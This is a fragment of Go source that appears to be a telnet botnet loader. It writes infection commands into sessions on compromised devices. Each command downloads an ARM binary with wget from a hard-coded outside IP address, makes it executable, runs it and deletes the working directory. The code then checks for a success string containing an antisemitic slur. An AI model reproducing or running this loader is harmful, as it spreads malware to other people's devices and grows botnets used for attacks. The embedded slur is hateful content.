...
func processTarget(target string) {
	...
	if ret != 1 {
		...
		statusRebooted++
	fmt.Println(info.ip)
	// Execute infection commands
	new_telnet.Write([]byte("mkdir /tmp/OneMan; cd /tmp/OneMan; wget http://103.83.86.117/1isequal9.arm6; cat 1isequal9.arm6 > netsat6; chmod 777 netsat6; ./netsat6 wnap; cd /tmp; rm -rf /tmp/OneMan\r\n"))
	new_telnet.Write([]byte("rm -rf /tmp/OneMan\r\n"))
	new_telnet.Write([]byte("mkdir /tmp/OneMan; cd /tmp/OneMan; wget http://103.83.86.117/1isequal9.arm5; cat 1isequal9.arm5 > netsat5; chmod 777 netsat5; ./netsat5 wnap; cd /tmp; rm -rf /tmp/OneMan\r\n"))
	new_telnet.Write([]byte("rm -rf /tmp/OneMan\r\n"))
	new_telnet.Write([]byte("mkdir /tmp/OneMan; cd /tmp/OneMan; wget http://103.83.86.117/1isequal9.arm4; cat 1isequal9.arm4 > netsat; chmod 777 netsat; ./netsat wnap; cd /tmp; rm -rf /tmp/OneMan\r\n"))
	new_telnet.Write([]byte("rm -rf /tmp/OneMan\r\n"))

	ret = readUntilString(new_telnet, "JEW was here lol") // read infection string to verify
	if ret != 1 {
		new_telnet.Close()
		info.cleanupTarget()
		syncWait.Done()
